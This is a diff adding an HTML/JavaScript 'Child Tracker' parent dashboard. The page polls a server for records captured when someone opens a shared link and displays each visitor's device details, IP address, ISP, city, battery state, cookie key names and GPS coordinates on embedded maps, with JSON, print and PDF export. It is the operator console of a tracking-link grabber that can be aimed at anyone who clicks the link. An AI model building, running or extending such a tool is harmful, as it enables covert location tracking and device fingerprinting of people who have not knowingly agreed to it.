@@ -1,0 +1,454 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Parent Dashboard — Child Tracker</title>
+  <style>
+    *{margin:0;padding:0;box-sizing:border-box}
+    body{font-family:'Segoe UI',sans-serif;background:#0d0d1a;color:#e0e0e0;min-height:100vh}
+
+    header{
+      background:linear-gradient(135deg,#1a1a2e,#16213e);
+      border-bottom:1px solid rgba(102,126,234,0.3);
+      padding:1.25rem 2rem;
+      display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:1rem
+    }
+    .logo{display:flex;align-items:center;gap:12px}
+    .logo-dot{width:10px;height:10px;border-radius:50%;background:#22c55e;animation:pulse 2s infinite;flex-shrink:0}
+    @keyframes pulse{0%,100%{box-shadow:0 0 0 0 rgba(34,197,94,0.5)}50%{box-shadow:0 0 0 8px rgba(34,197,94,0)}}
+    header h1{font-size:20px;font-weight:700;color:#fff}
+    header p{font-size:13px;color:rgba(255,255,255,0.5)}
+    .btns{display:flex;gap:8px;flex-wrap:wrap}
+    .btn{padding:8px 16px;border-radius:8px;cursor:pointer;font-size:13px;font-weight:600;border:none;transition:opacity 0.2s}
+    .btn:hover{opacity:0.85}
+    .btn-refresh{background:rgba(102,126,234,0.2);border:1px solid rgba(102,126,234,0.4);color:#a0a8f0}
+    .btn-clear  {background:rgba(239,68,68,0.15);border:1px solid rgba(239,68,68,0.3);color:#f87171}
+    .btn-pdf    {background:rgba(34,197,94,0.15);border:1px solid rgba(34,197,94,0.35);color:#4ade80}
+
+    .container{max-width:1040px;margin:2rem auto;padding:0 1.5rem}
+
+    .summary{
+      background:linear-gradient(135deg,rgba(102,126,234,0.1),rgba(118,75,162,0.1));
+      border:1px solid rgba(102,126,234,0.25);
+      border-radius:14px;padding:1.25rem 1.5rem;
+      display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:1rem;
+      margin-bottom:1.5rem
+    }
+    .count{background:rgba(102,126,234,0.25);color:#a0a8f0;font-size:12px;font-weight:700;padding:4px 12px;border-radius:20px}
+
+    .record{background:#13132a;border:1px solid rgba(255,255,255,0.08);border-radius:16px;margin-bottom:1.5rem;overflow:hidden}
+    .rec-header{
+      background:linear-gradient(135deg,rgba(102,126,234,0.15),rgba(118,75,162,0.15));
+      border-bottom:1px solid rgba(255,255,255,0.07);
+      padding:1rem 1.5rem;
+      display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:0.5rem
+    }
+    .rec-left{display:flex;align-items:center;gap:10px;flex-wrap:wrap}
+    .brand-badge{background:rgba(102,126,234,0.2);border:1px solid rgba(102,126,234,0.35);color:#a0a8f0;font-size:11px;font-weight:700;padding:3px 10px;border-radius:20px;white-space:nowrap}
+    .rec-title{font-size:15px;font-weight:700;color:#a0a8f0}
+    .rec-time{font-size:12px;color:rgba(255,255,255,0.35)}
+    .rec-actions{display:flex;gap:6px}
+    .btn-sm{padding:5px 12px;border-radius:6px;cursor:pointer;font-size:12px;font-weight:600;border:none}
+    .btn-print{background:rgba(34,197,94,0.15);border:1px solid rgba(34,197,94,0.3);color:#4ade80}
+    .btn-json {background:rgba(96,165,250,0.15);border:1px solid rgba(96,165,250,0.3);color:#60a5fa}
+
+    .sections{display:grid;grid-template-columns:1fr 1fr;gap:0}
+    @media(max-width:640px){.sections{grid-template-columns:1fr}}
+    .sec{border-right:1px solid rgba(255,255,255,0.06)}
+    .sec:last-child,.sec:nth-child(even){border-right:none}
+    .sec-title{
+      background:rgba(255,255,255,0.03);padding:0.65rem 1.25rem;
+      font-size:11px;font-weight:700;color:#667eea;
+      text-transform:uppercase;letter-spacing:1px;
+      border-bottom:1px solid rgba(255,255,255,0.06)
+    }
+    .row{
+      display:flex;justify-content:space-between;align-items:flex-start;
+      padding:9px 1.25rem;border-bottom:1px solid rgba(255,255,255,0.04);
+      font-size:13px;gap:8px
+    }
+    .row:last-child{border-bottom:none}
+    .lbl{color:rgba(255,255,255,0.4);white-space:nowrap;flex-shrink:0}
+    .val{font-weight:600;text-align:right;word-break:break-all;color:#e0e0e0}
+    .val.green {color:#22c55e}
+    .val.yellow{color:#facc15}
+    .val.red   {color:#f87171}
+    .val.blue  {color:#60a5fa}
+    .val.purple{color:#c084fc}
+    .val.cyan  {color:#22d3ee}
+    .val.dim   {color:rgba(255,255,255,0.3)}
+
+    .note-tag{
+      font-size:10px;background:rgba(250,204,21,0.15);border:1px solid rgba(250,204,21,0.3);
+      color:#facc15;padding:1px 6px;border-radius:8px;margin-left:4px;font-weight:600;
+    }
+
+    .full-sec{border-top:1px solid rgba(255,255,255,0.06)}
+
+    /* Map embed in dashboard */
+    .map-embed{width:100%;height:260px;border:none;display:block;margin-top:0}
+    .map-row{padding:0.6rem 1.25rem;font-size:12px;color:rgba(255,255,255,0.35);border-bottom:1px solid rgba(255,255,255,0.04)}
+
+    .maps-link{color:#60a5fa;text-decoration:none;font-weight:700}
+    .maps-link:hover{text-decoration:underline}
+    .loc-badge{display:inline-block;font-size:10px;font-weight:700;padding:2px 8px;border-radius:10px;margin-left:6px}
+    .loc-gps {background:rgba(34,197,94,0.2);color:#22c55e;border:1px solid rgba(34,197,94,0.3)}
+    .loc-wifi{background:rgba(96,165,250,0.2);color:#60a5fa;border:1px solid rgba(96,165,250,0.3)}
+    .loc-cell{background:rgba(250,204,21,0.2);color:#facc15;border:1px solid rgba(250,204,21,0.3)}
+    .loc-live{background:rgba(34,197,94,0.25);color:#22c55e;border:1px solid rgba(34,197,94,0.4)}
+
+    .battery-wrap{display:flex;align-items:center;gap:8px;justify-content:flex-end}
+    .battery-bar{width:60px;height:10px;border-radius:4px;background:rgba(255,255,255,0.1);overflow:hidden}
+    .battery-fill{height:100%;border-radius:4px}
+
+    .net-badge{display:inline-block;font-size:10px;font-weight:800;padding:2px 8px;border-radius:10px;margin-left:4px}
+    .net-5g  {background:rgba(34,197,94,0.25);color:#22c55e;border:1px solid rgba(34,197,94,0.4)}
+    .net-4g  {background:rgba(250,204,21,0.2);color:#facc15;border:1px solid rgba(250,204,21,0.35)}
+    .net-3g  {background:rgba(251,146,60,0.2);color:#fb923c;border:1px solid rgba(251,146,60,0.35)}
+    .net-2g  {background:rgba(239,68,68,0.2);color:#f87171;border:1px solid rgba(239,68,68,0.35)}
+    .net-wifi{background:rgba(96,165,250,0.2);color:#60a5fa;border:1px solid rgba(96,165,250,0.35)}
+
+    .empty{text-align:center;padding:5rem 2rem;color:rgba(255,255,255,0.25)}
+    .empty h2{font-size:20px;margin-bottom:0.5rem;color:rgba(255,255,255,0.4)}
+    .error{background:rgba(239,68,68,0.1);border:1px solid rgba(239,68,68,0.3);border-radius:10px;padding:1rem 1.5rem;color:#f87171;font-size:14px;margin-bottom:1rem}
+    .footer{text-align:center;font-size:12px;color:rgba(255,255,255,0.2);margin:1.5rem 0 3rem}
+
+    /* ── Print styles ── */
+    @media print{
+      body{background:#fff!important;color:#111!important}
+      header,.btns,.rec-actions,.btn,.footer{display:none!important}
+      .record{border:1px solid #ddd!important;background:#fff!important;break-inside:avoid;margin-bottom:1rem}
+      .rec-header{background:#f5f5f5!important;border-bottom:1px solid #ddd!important}
+      .rec-title,.rec-time{color:#111!important}
+      .sec-title{background:#eee!important;color:#333!important}
+      .lbl{color:#555!important}
+      .val,.val.green,.val.yellow,.val.blue,.val.red,.val.purple,.val.cyan,.val.dim{color:#111!important}
+      .maps-link{color:#0056d6!important}
+      .brand-badge,.loc-badge,.net-badge,.note-tag{border:1px solid #aaa!important;color:#333!important;background:#f0f0f0!important}
+      .battery-bar{background:#ddd!important}
+      .full-sec{border-top:1px solid #ddd!important}
+      .row{border-bottom:1px solid #eee!important}
+      .summary{background:#f5f5f5!important;border:1px solid #ddd!important;color:#111!important}
+      .container{max-width:100%!important;padding:0!important}
+      .map-embed{height:200px}
+      .print-header{display:block!important}
+    }
+    .print-header{display:none;text-align:center;padding:1rem 0 1.5rem;border-bottom:2px solid #667eea;margin-bottom:1.5rem}
+    .print-header h2{font-size:22px;color:#111}
+    .print-header p{font-size:13px;color:#555;margin-top:4px}
+  </style>
+</head>
+<body>
+
+<header>
+  <div class="logo">
+    <div class="logo-dot"></div>
+    <div>
+      <h1>Parent Dashboard</h1>
+      <p>Advanced Child Tracker — Auto-refreshes every 15s</p>
+    </div>
+  </div>
+  <div class="btns">
+    <button class="btn btn-refresh" onclick="loadData()">🔄 Refresh</button>
+    <button class="btn btn-pdf"     onclick="exportAllPDF()">⬇ Export PDF</button>
+    <button class="btn btn-clear"   onclick="clearData()">🗑 Clear All</button>
+  </div>
+</header>
+
+<div class="container">
+  <div class="print-header">
+    <h2>Child Tracker — Device Report</h2>
+    <p>Generated: <span id="print-date"></span></p>
+  </div>
+  <div class="summary">
+    <div>
+      <div style="font-weight:700;font-size:16px;color:#fff" id="sum-title">Loading...</div>
+      <div style="font-size:13px;color:rgba(255,255,255,0.4);margin-top:3px" id="sum-sub"></div>
+    </div>
+    <span class="count" id="count">0 records</span>
+  </div>
+  <div id="err" class="error" style="display:none"></div>
+  <div id="box"></div>
+  <div class="footer" id="footer"></div>
+</div>
+
+<script>
+const SERVER = window.location.origin;
+let allRecords = [];
+
+function esc(s){ return String(s||"").replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;") }
+function v(val,cls=""){ return `<span class="val ${cls}">${esc(val||"N/A")}</span>` }
+function row(lbl,valHtml){ return `<div class="row"><span class="lbl">${esc(lbl)}</span>${valHtml}</div>` }
+
+function batteryBar(pct){
+  if(!pct||pct==="N/A") return v("N/A");
+  const num=parseInt(pct);
+  const color=num>60?"#22c55e":num>20?"#facc15":"#f87171";
+  return `<div class="battery-wrap"><span class="val" style="color:${color}">${esc(pct)}</span><div class="battery-bar"><div class="battery-fill" style="width:${num}%;background:${color}"></div></div></div>`;
+}
+
+function networkBadge(d){
+  const nt=(d.network_type||"").toLowerCase();
+  let cls="val",badge="",label=esc(d.network_type||"N/A");
+  if(nt.includes("5g"))       {cls="val cyan";  badge=`<span class="net-badge net-5g">5G</span>`}
+  else if(nt.includes("wifi")){cls="val blue";  badge=`<span class="net-badge net-wifi">WiFi</span>`}
+  else if(nt.includes("4g")) {cls="val yellow"; badge=`<span class="net-badge net-4g">4G</span>`}
+  else if(nt.includes("3g")) {cls="val";        badge=`<span class="net-badge net-3g">3G</span>`}
+  else if(nt.includes("2g")) {cls="val red";    badge=`<span class="net-badge net-2g">2G</span>`}
+  return `<span class="${cls}">${label}</span>${badge}`;
+}
+
+function buildRecord(d, i){
+  const hasGPS = d.gps_latitude && !String(d.gps_latitude).includes("Await") && !String(d.gps_latitude).includes("Not");
+  const hasIP  = d.ip_latitude  && d.ip_latitude !== "N/A";
+  const brand  = d.device_brand || "";
+
+  // Brand badge
+  const brandBadge = (brand && brand!=="Unknown Brand" && brand!=="N/A")
+    ? `<span class="brand-badge">${esc(brand)}</span>` : "";
+
+  // GPS location
+  let gpsCoordHtml="", gpsExtra="";
+  if(hasGPS){
+    const lt=(d.location_type||"").toLowerCase();
+    const lbCls = lt.includes("gps")?"loc-gps":lt.includes("wifi")?"loc-wifi":"loc-cell";
+    const lbTxt = lt.includes("gps")?"GPS":lt.includes("wifi")?"WiFi":"Cell";
+    gpsCoordHtml = `<a class="maps-link" href="https://maps.google.com/?q=${esc(d.gps_latitude)},${esc(d.gps_longitude)}" target="_blank">${esc(d.gps_latitude)}, ${esc(d.gps_longitude)} — Open Map</a><span class="loc-badge ${lbCls}">${lbTxt}</span>`;
+    // OpenStreetMap embed
+    const lat=parseFloat(d.gps_latitude), lon=parseFloat(d.gps_longitude);
+    const osmUrl=`https://www.openstreetmap.org/export/embed.html?bbox=${lon-0.008},${lat-0.008},${lon+0.008},${lat+0.008}&layer=mapnik&marker=${lat},${lon}`;
+    gpsExtra = `
+      <iframe class="map-embed" src="${osmUrl}" allowfullscreen></iframe>
+      <div class="map-row">📍 ${esc(d.gps_latitude)}, ${esc(d.gps_longitude)} | ${esc(d.location_type||"")} | Accuracy: ${esc(d.gps_accuracy||"N/A")}</div>
+      ${d.gps_altitude&&d.gps_altitude!=="N/A"?row("Altitude",v(d.gps_altitude)):""}
+      ${d.gps_speed&&d.gps_speed!=="N/A"?row("Speed",v(d.gps_speed)):""}`;
+  } else {
+    gpsCoordHtml = `<span class="val dim">${esc(d.gps_latitude||"Awaiting permission")}</span>`;
+  }
+
+  const ipMapsHtml = hasIP
+    ? `<a class="maps-link" href="https://maps.google.com/?q=${esc(d.ip_latitude)},${esc(d.ip_longitude)}" target="_blank">${esc(d.ip_latitude)}, ${esc(d.ip_longitude)} — Open Map</a>`
+    : `<span class="val dim">N/A</span>`;
+
+  const cookiesEnabled = d.cookies_enabled===true||d.cookies_enabled==="true";
+  const ramNote = (d.ram_gb||"").includes("browser-capped")
+    ? `<span class="note-tag" title="Browsers cap RAM reporting at 8GB for privacy. Actual RAM may be higher.">⚠ capped by browser</span>`
+    : "";
+  const ramDisplay = (d.ram_gb||"N/A").replace(" (browser-capped)","");
+
+  return `
+  <div class="record" id="rec-${i}">
+    <div class="rec-header">
+      <div class="rec-left">
+        ${brandBadge}
+        <span class="rec-title">#${i+1} — ${esc(d.device_model||"Unknown")} | ${esc(d.city||"?")}, ${esc(d.country||"?")}</span>
+        ${hasGPS?`<span class="loc-badge loc-live">📍 LIVE</span>`:""}
+      </div>
+      <div style="display:flex;align-items:center;gap:10px;flex-wrap:wrap">
+        <span class="rec-time">${esc(d.server_time||d.time_opened||"")}</span>
+        <div class="rec-actions">
+          <button class="btn btn-sm btn-print" onclick="printRecord(${i})">🖨 Print</button>
+          <button class="btn btn-sm btn-json"  onclick="downloadJSON(${i})">⬇ JSON</button>
+        </div>
+      </div>
+    </div>
+
+    <div class="sections">
+      <div class="sec">
+        <div class="sec-title">Device Info</div>
+        ${row("Brand",         v(d.device_brand||"N/A","blue"))}
+        ${row("Device Model",  v(d.device_model,"blue"))}
+        ${row("OS",            v(d.os))}
+        ${row("OS Platform",   v(d.platform||d.os||"N/A"))}
+        ${row("Plat. Version", v(d.platform_version||"N/A"))}
+        ${row("Architecture",  v(d.architecture||"N/A"))}
+        ${row("Browser",       v(d.browser))}
+        ${row("Device Type",   v(d.device_type))}
+        <div class="row"><span class="lbl">RAM</span><span style="text-align:right">${v(ramDisplay)} ${ramNote}</span></div>
+        ${row("CPU Cores",     v(d.cpu_cores?d.cpu_cores+" cores":"N/A"))}
+        ${row("Screen",        v(d.screen))}
+        ${row("Color Depth",   v(d.color_depth))}
+        ${row("Touch Points",  v(d.touch_points))}
+      </div>
+
+      <div class="sec">
+        <div class="sec-title">Network &amp; IP Info</div>
+        ${row("IP Address",    v(d.ip_address,"blue"))}
+        ${row("ISP / Carrier", v(d.isp_name,"blue"))}
+        ${row("ASN",           v(d.asn))}
+        ${row("Country",       v(d.country+(d.country_code?" ("+d.country_code+")":"")))}
+        ${row("Region / State",v(d.region))}
+        ${row("City",          v(d.city))}
+        ${row("Postal Code",   v(d.postal_code))}
+        ${row("IP Timezone",   v(d.ip_timezone))}
+        ${row("Network Type",  networkBadge(d))}
+        ${row("Raw Effective", v(d.raw_effective||"N/A"))}
+        ${row("Speed (Down)",  v(d.downlink_mbps))}
+        ${row("Latency (RTT)", v(d.rtt_ms))}
+        ${row("Data Saver",    v(d.data_saver))}
+      </div>
+
+      <div class="sec">
+        <div class="sec-title">Battery Status</div>
+        ${row("Battery Level",  batteryBar(d.battery_level))}
+        ${row("Charging",       v(d.battery_charging,d.battery_charging==="Yes (Charging)"?"green":"yellow"))}
+        ${row("Charge Time",    v(d.charge_time))}
+        ${row("Discharge Time", v(d.discharge_time))}
+      </div>
+
+      <div class="sec">
+        <div class="sec-title">Session &amp; Cookies</div>
+        ${row("Time Opened",   v(d.time_opened))}
+        ${row("Server IP",     v(d.server_ip))}
+        ${row("Language",      v(d.language))}
+        ${row("Local Timezone",v(d.timezone_local))}
+        ${row("Cookies",       v(cookiesEnabled?"Enabled":"Disabled",cookiesEnabled?"green":"red"))}
+        ${row("Cookie Count",  v(d.cookie_count!==undefined?d.cookie_count+" cookie(s)":"N/A"))}
+        ${d.cookie_keys?row("Cookie Keys",v(d.cookie_keys)):""}
+      </div>
+    </div>
+
+    <div class="full-sec">
+      <div class="sec-title" style="padding:0.65rem 1.25rem">
+        📍 GPS / Cell Tower / WiFi Location (from device)
+      </div>
+      <div class="row"><span class="lbl">Coordinates</span><span class="val green">${gpsCoordHtml}</span></div>
+      ${gpsExtra}
+    </div>
+
+    <div class="full-sec">
+      <div class="sec-title" style="padding:0.65rem 1.25rem">🌐 IP-Based Approximate Location</div>
+      <div class="row"><span class="lbl">Coordinates</span><span class="val blue">${ipMapsHtml}</span></div>
+    </div>
+  </div>`;
+}
+
+async function loadData(){
+  try{
+    const res = await fetch(`${SERVER}/data`);
+    allRecords = await res.json();
+    document.getElementById("err").style.display="none";
+    document.getElementById("count").textContent=allRecords.length+" record"+(allRecords.length!==1?"s":"");
+    if(allRecords.length===0){
+      document.getElementById("sum-title").textContent="Waiting for child to open link...";
+      document.getElementById("sum-sub").textContent="Share the child link. Data appears here automatically.";
+      document.getElementById("box").innerHTML=`<div class="empty"><h2>No data yet</h2><p>Share the child link and wait.</p></div>`;
+    } else {
+      document.getElementById("sum-title").textContent=`Data received — ${allRecords.length} session(s) tracked`;
+      const r=allRecords[0];
+      document.getElementById("sum-sub").textContent="Latest: "+(r.device_brand?" "+r.device_brand:"")+(" "+r.device_model||"Unknown")+" — "+(r.city||"?")+", "+(r.country||"?");
+      document.getElementById("box").innerHTML=allRecords.map(buildRecord).join("");
+    }
+    document.getElementById("footer").textContent="Last refreshed: "+new Date().toLocaleString("en-IN",{timeZone:"Asia/Kolkata"});
+  }catch(e){
+    document.getElementById("err").style.display="block";
+    document.getElementById("err").textContent="Cannot connect to server. Make sure app.py is running. Error: "+e.message;
+  }
+}
+
+async function clearData(){
+  if(!confirm("Delete all records?")) return;
+  await fetch(`${SERVER}/clear`,{method:"DELETE"});
+  loadData();
+}
+
+function exportAllPDF(){
+  if(allRecords.length===0){alert("No records to export.");return}
+  document.getElementById("print-date").textContent=new Date().toLocaleString("en-IN",{timeZone:"Asia/Kolkata"});
+  document.querySelectorAll(".btns,.rec-actions").forEach(el=>el.style.display="none");
+  window.print();
+  setTimeout(()=>{
+    document.querySelectorAll(".btns").forEach(el=>el.style.display="flex");
+    document.querySelectorAll(".rec-actions").forEach(el=>el.style.display="flex");
+  },1500);
+}
+
+function printRecord(i){
+  const d=allRecords[i];
+  if(!d) return;
+  const hasGPS=d.gps_latitude&&!String(d.gps_latitude).includes("Await")&&!String(d.gps_latitude).includes("Not");
+  const w=window.open("","_blank","width=900,height=700");
+  const mapHtml=hasGPS?`
+    <div class="section-title">📍 Live Map</div>
+    <iframe src="https://www.openstreetmap.org/export/embed.html?bbox=${parseFloat(d.gps_longitude)-0.008},${parseFloat(d.gps_latitude)-0.008},${parseFloat(d.gps_longitude)+0.008},${parseFloat(d.gps_latitude)+0.008}&layer=mapnik&marker=${d.gps_latitude},${d.gps_longitude}" style="width:100%;height:260px;border:1px solid #ddd;border-radius:8px"></iframe>`:"";
+  w.document.write(`<!DOCTYPE html><html><head>
+    <meta charset="UTF-8"><title>Device Report — ${d.device_brand||""} ${d.device_model||""}</title>
+    <style>
+      body{font-family:Arial,sans-serif;font-size:13px;color:#111;margin:2rem}
+      h1{font-size:20px;margin-bottom:4px}
+      .sub{font-size:12px;color:#666;margin-bottom:1.5rem;border-bottom:2px solid #667eea;padding-bottom:1rem}
+      table{width:100%;border-collapse:collapse;margin-bottom:1.5rem}
+      th{background:#667eea;color:#fff;padding:7px 12px;text-align:left;font-size:11px;text-transform:uppercase}
+      td{padding:7px 12px;border-bottom:1px solid #eee}
+      td:first-child{color:#555;width:40%}td:last-child{font-weight:600}
+      .section-title{font-size:13px;font-weight:700;color:#667eea;margin:1rem 0 0.25rem;text-transform:uppercase}
+      a{color:#0056d6}
+    </style>
+  </head><body>
+    <h1>📱 ${d.device_brand||""} ${d.device_model||""} — Device Report</h1>
+    <div class="sub">Generated: ${new Date().toLocaleString("en-IN",{timeZone:"Asia/Kolkata"})} | Record #${i+1}</div>
+    ${mapHtml}
+    <div class="section-title">Device</div>
+    <table><tr><th colspan="2">Hardware</th></tr>
+      ${tr("Brand",d.device_brand)}${tr("Model",d.device_model)}${tr("OS",d.os)}
+      ${tr("Browser",d.browser)}${tr("Device Type",d.device_type)}
+      ${tr("RAM",d.ram_gb)}${tr("CPU Cores",d.cpu_cores?d.cpu_cores+" cores":"N/A")}
+      ${tr("Screen",d.screen)}${tr("Color Depth",d.color_depth)}${tr("Touch Points",d.touch_points)}
+    </table>
+    <div class="section-title">Network &amp; IP</div>
+    <table><tr><th colspan="2">Connectivity</th></tr>
+      ${tr("IP Address",d.ip_address)}${tr("ISP/Carrier",d.isp_name)}${tr("ASN",d.asn)}
+      ${tr("Country",d.country+(d.country_code?" ("+d.country_code+")":""))}
+      ${tr("City",d.city)}${tr("Network Type",d.network_type)}
+      ${tr("Speed",d.downlink_mbps)}${tr("Latency",d.rtt_ms)}
+    </table>
+    <div class="section-title">Battery</div>
+    <table><tr><th colspan="2">Battery</th></tr>
+      ${tr("Level",d.battery_level)}${tr("Charging",d.battery_charging)}
+      ${tr("Charge Time",d.charge_time)}${tr("Discharge Time",d.discharge_time)}
+    </table>
+    <div class="section-title">Session &amp; Cookies</div>
+    <table><tr><th colspan="2">Session</th></tr>
+      ${tr("Time Opened",d.time_opened)}${tr("Language",d.language)}
+      ${tr("Timezone",d.timezone_local)}
+      ${tr("Cookies",d.cookies_enabled?"Enabled":"Disabled")}
+      ${tr("Cookie Count",d.cookie_count!==undefined?d.cookie_count+" cookie(s)":"N/A")}
+      ${tr("Cookie Keys",d.cookie_keys||"none")}
+    </table>
+    <div class="section-title">📍 GPS Location</div>
+    <table><tr><th colspan="2">Device Location</th></tr>
+      ${tr("Latitude",d.gps_latitude)}${tr("Longitude",d.gps_longitude)}
+      ${tr("Accuracy",d.gps_accuracy)}${tr("Altitude",d.gps_altitude)}
+      ${tr("Speed",d.gps_speed)}${tr("Method",d.location_type)}
+      ${hasGPS?`<tr><td>Google Maps</td><td><a href="https://maps.google.com/?q=${d.gps_latitude},${d.gps_longitude}">Open Map</a></td></tr>`:""}
+    </table>
+    <div class="section-title">🌐 IP Location</div>
+    <table><tr><th colspan="2">Approximate</th></tr>
+      ${tr("Latitude",d.ip_latitude)}${tr("Longitude",d.ip_longitude)}
+    </table>
+    <script>window.print();window.onafterprint=()=>window.close();<\/script>
+  </body></html>`);
+  w.document.close();
+}
+
+function tr(label,value){
+  const s=String(value||"N/A").replace(/</g,"&lt;").replace(/>/g,"&gt;");
+  return `<tr><td>${label}</td><td>${s}</td></tr>`;
+}
+
+function downloadJSON(i){
+  const d=allRecords[i];
+  if(!d) return;
+  const blob=new Blob([JSON.stringify(d,null,2)],{type:"application/json"});
+  const url=URL.createObjectURL(blob);
+  const a=document.createElement("a");
+  a.href=url;a.download=`report_${i+1}_${(d.device_model||"device").replace(/\s+/g,"_")}.json`;
+  a.click();URL.revokeObjectURL(url);
+}
+
+loadData();
+setInterval(loadData,15000);
+</script>
+</body>
+</html>
